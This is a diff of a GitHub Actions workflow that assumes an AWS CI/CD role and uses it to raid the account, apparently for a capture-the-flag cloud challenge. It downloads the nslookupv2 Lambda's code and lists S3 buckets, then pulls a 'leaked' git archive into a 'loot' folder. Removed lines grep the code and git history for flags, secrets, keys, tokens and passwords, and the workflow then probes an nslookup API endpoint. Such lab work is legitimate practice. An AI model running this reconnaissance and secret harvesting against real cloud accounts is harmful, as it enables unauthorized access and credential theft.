@@ -20,79 +20,51 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: AWS identity
-        run: |
-          aws sts get-caller-identity
+      - name: Identity
+        run: aws sts get-caller-identity
 
       - name: Lambda info
         run: |
-          echo "===== LAMBDA CONFIG ====="
           aws lambda get-function-configuration \
-            --function-name nslookupv2
+          --function-name nslookupv2
 
-          echo "===== DOWNLOAD LAMBDA ====="
-          mkdir -p lambda_code
-
-          aws lambda get-function \
-            --function-name nslookupv2 \
-            --query 'Code.Location' \
-            --output text > lambda_url
-
-          curl -s $(cat lambda_url) -o lambda.zip
-
-          unzip -o lambda.zip -d lambda_code
-
-          echo "===== FILES ====="
-          find lambda_code -type f
-
-          echo "===== SEARCH ====="
-          grep -RniE "flag|secret|key|token|password|s3|aws|lambda|http" lambda_code || true
-
-
-      - name: S3 discovery
+      - name: Download Lambda
         run: |
-          echo "===== BUCKETS ====="
+          mkdir lambda
+          aws lambda get-function \
+          --function-name nslookupv2 \
+          --query 'Code.Location' \
+          --output text > url
+
+          curl -s $(cat url) -o lambda.zip
+          unzip lambda.zip -d lambda
+
+          cat lambda/lambda_function.py
+
+      - name: S3 buckets
+        run: |
           aws s3 ls
-
-          echo "===== PLATFORM ====="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true
-
-          echo "===== SITE ====="
-          aws s3 ls s3://site781fe43f26b9eba3/ || true
-
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/
 
       - name: Download leaked git
         run: |
-          mkdir -p loot
-
+          mkdir loot
           aws s3 cp \
           s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
           loot/dotgit.zip
 
-          unzip -o loot/dotgit.zip -d loot/dotgit
+          unzip -q loot/dotgit.zip -d loot
 
-          echo "===== GIT FILES ====="
-          find loot/dotgit/.git -type f | head
-
-          echo "===== SEARCH GIT HISTORY ====="
           cd loot/dotgit
-
-          git log --all --stat
-
-          git grep -nEi "flag|secret|key|token|password|aws|lambda|s3|api" $(git rev-list --all) || true
-
+          git log --all
 
       - name: CloudFront
         run: |
-          echo "===== CLOUDFRONT ====="
-          aws cloudfront list-distributions || true
+          aws cloudfront list-distributions
 
-
-      - name: Test API
+      - name: API test
         run: |
-          echo "===== API TEST ====="
-
-          curl -i -X POST \
+          curl -X POST \
           https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
           -H "Content-Type: application/json" \
           -d '{"domain":"example.com"}'
